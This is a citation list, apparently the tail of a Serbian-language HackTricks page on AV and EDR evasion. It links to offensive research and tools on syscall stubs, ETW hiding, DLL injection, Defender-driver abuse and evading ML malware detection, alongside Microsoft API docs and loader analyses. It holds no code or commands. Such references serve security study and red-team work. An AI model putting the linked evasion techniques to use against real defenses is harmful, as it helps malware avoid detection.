- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Skrivanje vašeg Dotnet Etw-a](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Zloupotreba Chrome Remote Desktop-a u Red Team operacijama: praktični vodič](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: pretvaranje Defender-ovog drajvera za sanaciju u kernel operativni primitiv](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Prateći kod za MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: kreiranje funkcija koje same sebe maskiraju pomoću LLVM-a](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - izvorni kod InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funkcija CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kreiranje podređenog procesa sa preusmerenim ulazom i izlazom](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: ponovno stvaranje C# alata pomoću WasmForge-a](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - kompajliranje C# / .NET projekata](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty dokaz koncepta i izvorni kod](https://github.com/epersic/DLLParty)
- [47] [DLLParty — zloupotreba internih funkcija thread pool-a za DLL injection bez shellcode-a](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 skup podataka za benchmark i alati thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Korišćenje EMBER2024 za evaluaciju implantata Red Team-a](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Zaobilaženje detekcija zasnovanih na mašinskom učenju](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader, .NET framework za učitavanje zasnovan na XAML-u](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – enumeracija AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – metod IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - tehnička analiza 2CLoader-a](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
{{#include ../banners/hacktricks-training.md}}
